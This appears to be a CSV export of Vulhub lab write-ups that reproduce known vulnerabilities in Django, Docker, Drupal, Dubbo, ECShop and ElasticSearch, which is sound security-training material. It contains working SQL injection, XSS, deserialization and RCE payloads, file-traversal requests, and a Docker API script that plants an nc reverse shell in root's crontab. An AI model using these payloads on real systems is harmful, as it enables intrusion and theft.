django,CVE-2022-34265,Django Trunc(kind) and Extract(lookup_name) SQL Injection (CVE-2022-34265),"Django Trunc(kind) and Extract(lookup_name) SQL Injection (CVE-2022-34265)

中文版本(Chinese version)

Django is a high-level Python web framework that encourages rapid development and clean, pragmatic design.

Django released a security update on July 4, 2022, which fixes a SQL injection vulnerability in the Trunc() and Extract() database functions. This vulnerability affects Django versions before 4.0.6, 3.2.14.

References:
https://www.djangoproject.com/weblog/2022/jul/04/security-releases/
https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492

Environment Setup

Execute the following command to start a vulnerable Django 4.0.5 server:


docker compose up -d


After the server is started, you can access the web page at http://your-ip:8000.

Vulnerability Reproduction

The web application uses the Trunc function to aggregate page click counts by datetime. Visit http://your-ip:8000/?date=minute to see the number of clicks per minute:



To exploit the SQL injection vulnerability, modify the date parameter with malicious input:


http://your-ip:8000/?date=xxxx'xxxx


The SQL error message will be displayed, confirming the successful injection:
-------------------------------------------------------------------------------","https://www.djangoproject.com/weblog/2022/jul/04/security-releases/
https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492"
django,CVE-2017-12794,Django 500 Debug Page Cross-Site Scripting (XSS) (CVE-2017-12794),"Django 500 Debug Page Cross-Site Scripting (XSS) (CVE-2017-12794)

中文版本(Chinese version)

Django is a high-level Python web framework that encourages rapid development and clean, pragmatic design.

Django versions before 1.11.5 and 1.10.8 contain a cross-site scripting (XSS) vulnerability in the debug error page. When DEBUG mode is enabled, error pages could potentially expose sensitive information through unescaped HTML in the error message.

The vulnerability is triggered when a database error occurs and its details are displayed in the debug page. The error message from the database is not properly escaped before being rendered in the template.

References:
<https://www.djangoproject.com/weblog/2017/sep/05/security-releases/
<https://nvd.nist.gov/vuln/detail/CVE-2017-12794
<https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html

Environment Setup

Execute the following command to start a vulnerable Django server (the version of Django is 1.11.4):


docker compose up -d


After the server is started, you can access the Django home page at http://your-ip:8000.

Vulnerability Reproduction

Visit the following URL to create a user with a malicious username containing JavaScript code:


http://your-ip:8000/create_user/?username=<scriptalert(1)</script


The first request will succeed. Then, visit the same URL again to trigger a database unique constraint error. The error page will include the unescaped username in the error message:



The JavaScript code in the username will be executed in the browser, demonstrating the XSS vulnerability. This vulnerability could be exploited by attackers to execute arbitrary JavaScript code in the context of the debug page, potentially leading to session hijacking or other client-side attacks.

For detailed principle of this vulnerability, please refer to the third link in the references section: <https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html
-------------------------------------------------------------------------------","https://www.djangoproject.com/weblog/2017/sep/05/security-releases/
https://nvd.nist.gov/vuln/detail/CVE-2017-12794
https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html
https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html"
django,CVE-2020-9402,Django GIS functions and aggregates on Oracle SQL Injection (CVE-2020-9402),"Django GIS functions and aggregates on Oracle SQL Injection (CVE-2020-9402)

中文版本(Chinese version)

Django is a high-level Python web framework that encourages rapid development and clean, pragmatic design.

Django released a security update on March 4, 2020, which fixes a SQL injection vulnerability in the GIS functions and aggregates on Oracle. This vulnerability affects Django versions before 3.0.4, 2.2.11, and 1.11.29.

The vulnerability requires the developer to use GIS functions and aggregates, and the field name of the queryset can be controlled by the user. This vulnerability can be exploited through Django's built-in admin interface.

References:
https://www.djangoproject.com/weblog/2020/mar/04/security-releases/

Environment Setup

Execute the following command to compile and start a vulnerable Django 3.0.3 server:


docker compose build
docker compose up -d


After the server is started, you can access the Django home page at http://your-ip:8000.

Vulnerability Reproduction

First, visit http://your-ip:8000/vuln/. You can inject SQL by adding malicious input to the q parameter:


http://your-ip:8000/vuln/?q=20) = 1 OR (select utlinaddr.gethost_name((SELECT version FROM v$instance)) from dual) is null  OR (1+1


The SQL error message will be displayed, confirming the successful injection:



Alternatively, you can visit http://your-ip:8000/vuln2/ and inject SQL using a different payload:


http://your-ip:8000/vuln2/?q=0.05))) FROM ""VULNCOLLECTION2""  where  (select utlinaddr.gethostname((SELECT user FROM DUAL)) from dual) is not null  --


The SQL error message will again confirm the successful injection:
-------------------------------------------------------------------------------",https://www.djangoproject.com/weblog/2020/mar/04/security-releases/
django,CVE-2018-14574,Django < 2.0.8 Open Redirect in CommonMiddleware (CVE-2018-14574),"Django < 2.0.8 Open Redirect in CommonMiddleware (CVE-2018-14574)

中文版本(Chinese version)

Django is a high-level Python web framework that encourages rapid development and clean, pragmatic design.

Django versions before 2.0.8 and 1.11.15 contain an open redirect vulnerability in CommonMiddleware when both django.middleware.common.CommonMiddleware and the APPEND_SLASH setting are enabled. If the project has a URL pattern that accepts any path ending in a slash, a maliciously crafted URL could lead to a redirect to an arbitrary external site, enabling phishing and other attacks.

References:
<https://www.djangoproject.com/weblog/2018/aug/01/security-releases/
<https://nvd.nist.gov/vuln/detail/CVE-2018-14574

Environment Setup

Execute the following command to start a vulnerable Django 2.0.7 server:


docker compose build
docker compose up -d


After the server is started, you can access the Django home page at http://your-ip:8000.

Vulnerability Reproduction

Visit the following URL to trigger the open redirect vulnerability:


http://your-ip:8000//www.example.com


The server will redirect you to //www.example.com/, which the browser interprets as an absolute URL, effectively redirecting to an external site:



This vulnerability can be exploited by attackers to redirect users to malicious websites, potentially leading to phishing attacks or other security issues.
-------------------------------------------------------------------------------","https://www.djangoproject.com/weblog/2018/aug/01/security-releases/
https://nvd.nist.gov/vuln/detail/CVE-2018-14574"
dns,Unknown,DNS Zone Transfers (AXFR),"DNS Zone Transfers (AXFR)

中文版本(Chinese version)

DNS zone transfers using the AXFR protocol are the simplest mechanism to replicate DNS records across DNS servers. To avoid the need to edit information on multiple DNS servers, you can edit information on one server and use AXFR to copy information to other servers. However, if you do not protect your servers, malicious parties may use AXFR to get information about all your hosts.

References:
https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/
https://nmap.org/nsedoc/scripts/dns-zone-transfer.html

Vulnerable Environment

Vulhub uses Bind9 to build the dns server, but that does not mean that only Bind9 supports AXFR records.

To run the DNS server.


docker compose up -d


Once the environment is running, it will listen on port 53 of TCP and UDP, and the DNS protocol supports data transfer from both ports.

POC

Under Linux, we can use the dig command to send AXFR record requests: dig @your-ip -t axfr vulhub.org



As you can see, I got all the subdomain records of vulhub.org, and there is a DNS zone transfers vulnerability here.

We can also use the Nmap script to scan for this vulnerability: nmap --script dns-zone-transfer.nse --script-args ""dns-zone-transfer.domain=vulhub.org"" -Pn -p 53 your-ip
-------------------------------------------------------------------------------","https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/
https://nmap.org/nsedoc/scripts/dns-zone-transfer.html"
docker,Unknown,Docker Remote API Unauthorized Access Leads to Remote Code Execution,"Docker Remote API Unauthorized Access Leads to Remote Code Execution

中文版本(Chinese version)

Docker is a platform-as-a-service solution that delivers software in packages called containers. The Docker daemon (dockerd) exposes a REST API that allows remote management of Docker containers, images, and other resources.

When the Docker daemon is configured to listen on a network port (typically TCP port 2375) without proper authentication mechanisms, attackers can gain unauthorized access to the Docker API. This vulnerability allows attackers to create, modify, and execute containers on the host system, potentially leading to remote code execution, data theft, and complete host system compromise.
<https://docs.docker.com/engine/security/protect-access/
<https://tttang.com/archive/357/

Environment Setup

Execute the following command to start the vulnerable Docker environment:


docker compose build
docker compose up -d


After the environment is started, the Docker daemon will listen on port 2375 without any authentication requirements.

Vulnerability Reproduction

The vulnerability can be exploited using Python with the docker-py library. The attack involves creating a new container that mounts the host's /etc directory, allowing an attacker to modify critical system files. In this example, we will demonstrate the vulnerability by adding a malicious crontab entry that creates a reverse shell.

First, install the required Python library:


pip install docker


Then create and run a Python script that exploits the vulnerability:

python
import docker

client = docker.DockerClient(base_url='http://your-ip:2375/')
data = client.containers.run('alpine:latest', r'''sh -c ""echo '    * /usr/bin/nc your-ip 21 -e /bin/sh' /tmp/etc/crontabs/root"" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})


The script creates a container that mounts the host's /etc directory and adds a reverse shell command to the root user's crontab. Within a minute, the cron daemon will execute the command, establishing a reverse shell connection to the attacker's machine.

The successful exploitation can be verified by receiving the reverse shell connection:



This vulnerability demonstrates the critical importance of properly securing Docker daemon access and implementing authentication mechanisms for remote API endpoints.
-------------------------------------------------------------------------------","https://docs.docker.com/engine/security/protect-access/
https://tttang.com/archive/357/"
drupal,CVE-2018-7600,Drupal Drupalgeddon 2 Unauthenticated Remote Code Execution (CVE-2018-7600),"Drupal Drupalgeddon 2 Unauthenticated Remote Code Execution (CVE-2018-7600)

中文版本(Chinese version)

Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations including the Form API.

References:
<https://www.drupal.org/sa-core-2018-002
<https://research.checkpoint.com/uncovering-drupalgeddon-2/

Vulnerable environment

Run the following command to start a vulnerable Drupal 8.5.0 environment:


docker compose up -d


After the environment is started, visit http://your-ip:8080/ and you will see the drupal installation page. Complete the drupal installation using the ""standard"" profile. Because there is no mysql environment, you should select sqlite database when installing. Once the installation is complete you are ready to start exploiting it.

Exploit

Referring to a2u/CVE-2018-7600, we can send the following request to drupal:


POST /user/register?elementparents=account/mail/%23value&ajaxform=1&wrapperformat=drupal_ajax HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

formid=userregisterform&drupalajax=1&mail[#postrender][]=exec&mail[#type]=markup&mail[#markup]=id


Upon successful execution of the code, the id command is executed:
-------------------------------------------------------------------------------","https://www.drupal.org/sa-core-2018-002
https://research.checkpoint.com/uncovering-drupalgeddon-2/"
drupal,CVE-2019-6341,Drupal Cross-Site Scripting by File Upload (CVE-2019-6341),"Drupal Cross-Site Scripting by File Upload (CVE-2019-6341)

中文版本(Chinese version)

Drupal is a free and open-source web content management framework written in PHP.

A cross-site scripting (XSS) vulnerability exists in Drupal 7.x before 7.65, Drupal 8.x before 8.5.14 and 8.6.x before 8.6.13. The vulnerability is caused by improper handling of file uploads in the file module or subsystem, which can lead to stored XSS attacks.

References:
<https://www.drupal.org/sa-core-2019-004
<https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed
<https://paper.seebug.org/897/

Environment Setup

Execute the following command to start a vulnerable Drupal 8.5.0 server:


docker compose up -d


After the server is started, visit http://your-ip:8080/ to access the Drupal installation page. Follow the default configuration steps to complete the installation. Since there is no MySQL environment, you can choose SQLite as the database.

Vulnerability Reproduction

This vulnerability exploits a flaw in Drupal's file module that allows uploading a specially crafted file without extension. The file appears to be an image but actually contains HTML code with embedded JavaScript. When other users visit the link to this file, the XSS payload will be executed.

By default, Drupal stores uploaded images in the /sites/default/files/pictures/<YYYY-MM/ directory.

To exploit the vulnerability, use the PoC script from thezdi/PoC to create and upload a malicious GIF file. Execute the following command, where the first argument is the target IP and the second is the target port:


php cve-2019-6341-exp.php 192.168.11.1 8080




After successful upload, visiting the image location will trigger the XSS vulnerability:



Note:

1. Chrome and Firefox browsers have built-in XSS filters, so it's recommended to use Edge or IE browsers for testing.
2. The uploaded image name ends with ""_0"" due to Drupal's rule mechanism. For more details, see Drupal 1-click to RCE Analysis
3. The chain of this bug and CVE-2019-6339, which can lead to remote code execution by 1 click
-------------------------------------------------------------------------------","https://www.drupal.org/sa-core-2019-004
https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed
https://paper.seebug.org/897/"
drupal,CVE-2019-6339,Drupal Remote Code Execution by phar deserialization (CVE-2019-6339),"Drupal Remote Code Execution by phar deserialization (CVE-2019-6339)

中文版本(Chinese version)

Drupal is a free and open-source web content management framework written in PHP.

A remote code execution vulnerability exists in Drupal 7.x before 7.62, Drupal 8.5.x before 8.5.9 and 8.6.x before 8.6.6. The vulnerability is caused by improper handling of PHAR deserialization in the file system service, which can lead to remote code execution.

References:
<https://www.drupal.org/sa-core-2019-002
<https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed
<https://paper.seebug.org/897/

Environment Setup

Execute the following command to start a vulnerable Drupal 8.5.0 server:


docker compose up -d


After the server is started, visit http://your-ip:8080/ to access the Drupal installation page. Follow the default configuration steps to complete the installation. Since there is no MySQL environment, you can choose SQLite as the database.

Vulnerability Reproduction

First, log in as an administrator and upload an avatar. The avatar image should be a specially crafted PoC file (you can refer to thezdi/PoC for the PoC):



By default, Drupal stores uploaded images in the /sites/default/files/pictures/<YYYY-MM/ directory and keeps their original filenames. This information is important for exploiting the vulnerability.

Visit http://127.0.0.1:8080/admin/config/media/file-system and enter the path to the previously uploaded image in the ""Temporary directory"" field. For example:


phar://./sites/default/files/pictures/2019-06/blog-ZDI-CAN-7232-cat_0.jpg


Save the configuration to trigger the vulnerability. The successful exploitation will be confirmed by the execution of the malicious code:
-------------------------------------------------------------------------------","https://www.drupal.org/sa-core-2019-002
https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed
https://paper.seebug.org/897/"
drupal,CVE-2017-6920,Drupal Core 8 PECL YAML Deserialization Remote Code Execution (CVE-2017-6920),"Drupal Core 8 PECL YAML Deserialization Remote Code Execution (CVE-2017-6920)

中文版本(Chinese version)

Drupal is a free and open-source web content management framework written in PHP.

A remote code execution vulnerability exists in Drupal 8.x through 8.3.4 when using the PECL YAML parser. The vulnerability is caused by unsafe deserialization of YAML content, allowing attackers to execute arbitrary code.

References:
<https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-06-21/drupal-core-multiple
<https://paper.seebug.org/334/

Environment Setup

Execute the following command to start a vulnerable Drupal 8.3.0 server:


docker compose up -d


After the server is started, visit http://your-ip:8080/ to access the Drupal installation page. Follow the default configuration steps to complete the installation. Since there is no MySQL environment, you can choose SQLite as the database.

Vulnerability Reproduction

To reproduce this vulnerability, first log in to the Drupal site with administrator credentials. Once logged in, navigate to the configuration import page at http://127.0.0.1:8080/admin/config/development/configuration/single/import.

Select ""Simple configuration"" for Configuration type, enter any name for Configuration name, and paste the following PoC in ""Paste your configuration here"":

php
!php/object ""O:24:\""GuzzleHttp\\Psr7\\FnStream\"":2:{s:33:\""\0GuzzleHttp\\Psr7\\FnStream\0methods\"";a:1:{s:5:\""close\"";s:7:\""phpinfo\"";}s:9:\""fnclose\"";s:7:\""phpinfo\"";}""




Click ""Import"" and you will see the vulnerability has been successfully triggered, displaying the phpinfo page:



Note: Although official CPE information indicates this vulnerability exists since version 8.0.0, our testing shows it can only be reproduced in Drupal 8.3.0, not in 8.0.0.
-------------------------------------------------------------------------------","https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-06-21/drupal-core-multiple
https://paper.seebug.org/334/"
drupal,CVE-2014-3704,"Drupal < 7.32 ""Drupalgeddon"" SQL Injection (CVE-2014-3704)","Drupal < 7.32 ""Drupalgeddon"" SQL Injection (CVE-2014-3704)

中文版本(Chinese version)

Drupal is a free and open-source web content management framework written in PHP and distributed under the GNU General Public License.

The expandArguments function in the database abstraction API in Drupal core 7.x before 7.32 does not properly construct prepared statements, which allows remote attackers to conduct SQL injection attacks via an array containing crafted keys.

References:
<https://www.drupal.org/SA-CORE-2014-005
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704

Vulnerable Environment

Execute the following command to start a Drupal 7.31.


docker compose up -d


After the server is started, browse http://your-ip:8080 to see the Drupal installation wizard, and use the default configuration to install it.

Note that the Mysql database name is drupal, the database username and password is root, and the address is mysql:



After the installation is complete, browse the home page.



POC

The SQL injection does not require authentication and can execute malicious SQL statements by sending the following request.


POST /?q=node&destination=node HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

pass=lol&formbuildid=&formid=userlogin_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a


As can be seen, the SQL statement reports an error message with user data.
-------------------------------------------------------------------------------","https://www.drupal.org/SA-CORE-2014-005
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704"
drupal,CVE-2018-7602,Drupal Drupalgeddon 3 Authenticated Remote Code Execution (CVE-2018-7602),"Drupal Drupalgeddon 3 Authenticated Remote Code Execution (CVE-2018-7602)

中文版本(Chinese version)

Drupal is a free and open-source web content management framework written in PHP.

A remote code execution vulnerability exists in Drupal 7.x and 8.x. The vulnerability is caused by insufficient input sanitization, where double URL encoding of the '#' character can bypass the sanitize() function filter, leading to remote code execution.

References:
<https://www.drupal.org/sa-core-2018-004
<https://github.com/pimps/CVE-2018-7600
<https://github.com/kastellanos/CVE-2018-7602

Environment Setup

Execute the following command to start a vulnerable Drupal 7.57 server:

bash
docker compose up -d


After the server is started, visit http://your-ip:8080/ to access the Drupal installation page. Follow the default configuration steps to complete the installation. Since there is no MySQL environment, you can choose SQLite as the database.

Remember the username and password of the account you created during the installation, because you will need it to exploit the vulnerability.

Vulnerability Reproduction

Using the PoC from pimps/CVE-2018-7600, execute the following command to exploit the vulnerability:

bash
Replace ""id"" with the command you want to execute
First ""drupal"" is your username, second ""drupal"" is your password
python3 drupa7-CVE-2018-7602.py -c ""id"" drupal drupal http://127.0.0.1:8080/


As shown in the red box in the image below, the command is successfully executed:
-------------------------------------------------------------------------------","https://www.drupal.org/sa-core-2018-004
https://github.com/pimps/CVE-2018-7600
https://github.com/kastellanos/CVE-2018-7602
http://127.0.0.1:8080/"
dubbo,CVE-2019-17564,Aapche Dubbo Unsafe Java Deserialization (CVE-2019-17564),"Aapche Dubbo Unsafe Java Deserialization (CVE-2019-17564)

中文版本(Chinese version)

Apache Dubbo is a high-performance, java based open source RPC framework.

Apache Dubbo supports different protocols, and its HTTP protocol handler is a wrapper of Spring Framework's org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter.

A security warning of Spring Framework shows that an unsafe Java deserialization is exist in the HttpInvokerServiceExporter, which could lead to a RCE vulnerability:

WARNING: Be aware of vulnerabilities due to unsafe Java deserialization: Manipulated input streams could lead to unwanted code As a consequence, do not expose HTTP invoker endpoints to untrusted As a consequence, do not expose HTTP invoker endpoints to untrusted clients but rather just between your own services. In general, we strongly recommend any other message format (e.g. JSON) instead.

This vulnerability affects Apache Dubbo 2.7.4 and earlier, after 2.7.5 Dubbo replace HttpInvokerServiceExporter with com.googlecode.jsonrpc4j.JsonRpcServer.

Reference links.
https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html
https://www.anquanke.com/post/id/198747
https://paper.seebug.org/1128/

Vulnerable Application

Start an Apache Dubbo 2.7.3 Provider by executing the following command.


docker compose up -d


After the service is started, browser http://your-ip:8080 and the server will return an empty 500 error page by default.

Exploit

It is important to know the RPC interface name before leveraging this vulnerability.

Vulhub is exposing the port 8080 and port 2181, where 2181 is the port of Zookeeper. Download Zookeeper and use the script zkCli to connect to the unauthenticated Zookeeper server:


./zkCli -server target-ip:2181


After connecting, it is come with an interactive console, where you can ls all nodes, including Dubbo-related configuration.



Get the RPC interface named org.vulhub.api.CalcService. Use ysoserial to generate a CommonsCollections6 payload, then send it to http://your-ip:8080/org.vulhub.api.CalcService as POST body.


java -jar ysoserial.jar CommonsCollections6 ""touch /tmp/success"" 1.poc
curl -XPOST --data-binary @1.poc http://your-ip:8080/org.vulhub.api.CalcService




Entering the container, you can see that touch /tmp/success has been executed successfully.
-------------------------------------------------------------------------------","https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html
https://www.anquanke.com/post/id/198747
https://paper.seebug.org/1128/
http://your-ip:8080/org.vulhub.api.CalcService"
ecshop,Unknown,ECShop 2.x/3.x SQL Injection / Remote Code Execution Vulnerability,"ECShop 2.x/3.x SQL Injection / Remote Code Execution Vulnerability

中文版本(Chinese version)

ECShop is a B2C independent shop system for companies and individuals to quickly build personalized online store. This system is a cross-platform open source program based on PHP language and MYSQL database architecture.

In 2017 and previous versions, there was a SQL injection vulnerability that could inject payload and eventually lead to code execution vulnerabilities. The latest version of 3.6.0 has fixed the vulnerability, and vulhub uses its latest version 2.7.3 and 3.6.0 non-latest version versions to reproduce the vulnerability.

Reference link:
https://paper.seebug.org/691/

Environment setup

Run the following commands to start environment


docker compose up -d


After the environment start, visit http://your-ip:8080, you will see the 2.7.3 installation page. Visit http://your-ip:8081, you will see the 3.6.0 installation page.

Install both of them, mysql address is mysql, mysql account and password are root, the database name is free to fill in, but the database names of 2.7.3 and 3.6.0 can not be the same.

As the picture shows:



Exploit

There is a script that can generate POC for 2.x and 3.x:

php
<?php
$shell = bin2hex(""{\$asd'];phpinfo\t();//}xxx"");
$id = ""-1' UNION/*"";
$arr = [
    ""num"" =sprintf('*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -', bin2hex($id), $shell),
    ""id"" =$id
];

$s = serialize($arr);

$hash3 = '45ea207d7a2b68c49582d2d22adf953a';
$hash2 = '554fcae493e564ee0dc75bdf2ebf94ca';

echo ""POC for ECShop 2.x: \n"";
echo ""{$hash2}ads|{$s}{$hash2}"";
echo ""\n\nPOC for ECShop 3.x: \n"";
echo ""{$hash3}ads|{$s}{$hash3}"";


Put POC in the HTTP-Referer:


GET /user.php?act=login HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECSID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visittimes]=1
Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:""num"";s:107:""/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -"";s:2:""id"";s:11:""-1' UNION/"";}45ea207d7a2b68c49582d2d22adf953a
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0




Result of 2.x:



Result of 3.x:
-------------------------------------------------------------------------------",https://paper.seebug.org/691/
ecshop,Unknown,ECShop 4.x collection_list SQL Injection,"ECShop 4.x collection_list SQL Injection

中文版本(Chinese version)

ECShop is a popular open-source e-commerce system. A SQL injection vulnerability exists in the collectionlist functionality of ECShop 4.x versions, which allows attackers to execute arbitrary SQL queries through the insert functions.

References:
<https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw
<http://foreversong.cn/archives/1556

Environment Setup

Execute the following command to start ECShop 4.0.6:


docker compose up -d


After the server starts, visit http://your-ip:8080 to begin the installation process. During installation:
Set the database address to mysql
Set both username and password to root

Vulnerability Reproduction

The vulnerability is similar to xianzhi-2017-02-82239600, where arbitrary insert_ functions can be exploited for SQL injection.

Multiple insert functions can be used for exploitation. For example, using insertuser_account:

http
GET /user.php?act=collection_list HTTP/1.1
Host: your-ip:8080
X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auseraccount|a:2:{s:7:""userid"";s:38:""0'-(updatexml(1,repeat(user(),2),1))-'"";s:7:""payment"";s:1:""4"";}|45ea207d7a2b68c49582d2d22adf953a
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Cookie: ECSID=f7b1398a0fdc189b691a6f1c969911ac1eea8fca;ECS[password]=445ac05c4ae0555ed091bb977b08581f;ECS[userid]=3;ECS[username]=demo;ECS[visittimes]=2;ECSCPID=1a8bddd69b3b81efbe441a185ac52e7d24852d87;PHPSESSID=bb2033d66975ff7c2be29896d2d4260c;real_ipd=172.18.0.1;
Connection: close





Note: You must be logged in as a normal user before attempting exploitation.

Alternatively, you can use insertpaylog as shown in this example:

http
GET /user.php?act=collection_list HTTP/1.1
Host: 192.168.1.162:8080
X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:44:""1' and updatexml(1,repeat(user(),2),1) and '"";|
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Cookie: ECSID=f7b1398a0fdc189b691a6f1c969911ac1eea8fca;ECS[password]=445ac05c4ae0555ed091bb977b08581f;ECS[userid]=3;ECS[username]=demo;ECS[visittimes]=2;ECSCPID=1a8bddd69b3b81efbe441a185ac52e7d24852d87;PHPSESSID=bb2033d66975ff7c2be29896d2d4260c;real_ipd=172.18.0.1;
Connection: close
-------------------------------------------------------------------------------","https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw
http://foreversong.cn/archives/1556"
elasticsearch,CVE-2014-3120,ElasticSearch Remote Code Execution (CVE-2014-3120),"ElasticSearch Remote Code Execution (CVE-2014-3120)

中文版本(Chinese version)

ElasticSearch is a distributed, RESTful search and analytics engine.

The default configuration in Elasticsearch before 1.2 enables dynamic scripting, which allows remote attackers to execute arbitrary MVEL expressions and Java code via the source parameter to _search.

Here's an example of MVEL code that executes system commands:

java
import java.io.*;
new java.util.Scanner(Runtime.getRuntime().exec(""id"").getInputStream()).useDelimiter(""\\A"").next();


References:
<https://bou.ke/blog/elasticsearch-rce/
<https://www.exploit-db.com/exploits/33370

Vulnerability Reproduction

Execute the following commands to start a vulnerable ElasticSearch server 1.1.1:


docker compose up -d


After the server starts, you can access the ElasticSearch API at http://your-ip:9200.

Exploitation

The exploit requires at least one document in the index. First, create a document:


POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  ""name"": ""vulhub""
}


Then, send a request containing the malicious MVEL script to execute arbitrary commands:


POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 343

{
    ""size"": 1,
    ""query"": {
      ""filtered"": {
        ""query"": {
          ""match_all"": {
          }
        }
      }
    },
    ""script_fields"": {
        ""command"": {
            ""script"": ""import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\""id\"").getInputStream()).useDelimiter(\""\\\\A\"").next();""
        }
    }
}


The command execution result will be returned in the response:
-------------------------------------------------------------------------------","https://bou.ke/blog/elasticsearch-rce/
https://www.exploit-db.com/exploits/33370"
elasticsearch,CVE-2015-3337,ElasticSearch Plug-in Directory Traversal (CVE-2015-3337),"ElasticSearch Plug-in Directory Traversal (CVE-2015-3337)

中文版本(Chinese version)

ElasticSearch is a distributed, RESTful search and analytics engine.

In the ElasticSearch versions before 1.4.5 and 1.5.x before 1.5.2, a directory traversal vulnerability exists in ElasticSearch's plugin functionality that allows attackers to read arbitrary files on the system.

References:
<https://nvd.nist.gov/vuln/detail/CVE-2015-3337
<https://github.com/elastic/elasticsearch/issues/10828

Vulnerability Description

After installing a plugin with ""site"" functionality, an attacker can use ../ in the plugin directory path to traverse up the directory tree, leading to arbitrary file read. ElasticSearch installations without any plugins are not affected.

Environment Setup

Execute the following commands to build and start an ElasticSearch server 1.4.4:


docker compose build
docker compose up -d


The test environment comes with a pre-installed plugin: elasticsearch-head, which is a web front-end for ElasticSearch. More information about this plugin can be found at: <https://github.com/mobz/elasticsearch-head

Vulnerability Reproduction

To exploit this vulnerability, send a request to read arbitrary files using directory traversal in the plugin path. For example, to read /etc/passwd, send a request to:


http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd


Note: Do not access this URL directly in a browser.



Additional Information

The head plugin provides a web interface for ElasticSearch. You can access it at http://your-ip:9200/_plugin/head/ to interact with your ElasticSearch cluster through a graphical interface.
-------------------------------------------------------------------------------","https://nvd.nist.gov/vuln/detail/CVE-2015-3337
https://github.com/elastic/elasticsearch/issues/10828
https://github.com/mobz/elasticsearch-head"
elasticsearch,CVE-2015-5531,ElasticSearch Snapshot and Restore Directory Traversal (CVE-2015-5531),"ElasticSearch Snapshot and Restore Directory Traversal (CVE-2015-5531)

中文版本(Chinese version)

ElasticSearch is a distributed, RESTful search and analytics engine.

In the ElasticSearch versions before 1.6.1, a directory traversal vulnerability exists in ElasticSearch's snapshot and restore functionality, allowing attackers to read arbitrary files on the system.

The conditions for exploiting this vulnerability vary depending on the specific version of the target: in ElasticSearch 1.5.1 and earlier versions, this vulnerability could be triggered without any configuration; in later versions, the path.repo configuration must be set in elasticsearch.yml. This configuration specifies a directory that must be writable and serves as the root location for backup repositories. Without this configuration, the snapshot and restore functionality is disabled by default.

References:
<https://www.exploit-db.com/exploits/38383/
<http://www.freebuf.com/vuls/99942.html

Environment Setup

Execute the following commands to build and start an ElasticSearch server 1.6.0:


docker compose build
docker compose up -d


After the environment starts, you can access the ElasticSearch server at http://your-ip:9200.

Vulnerability Reproduction

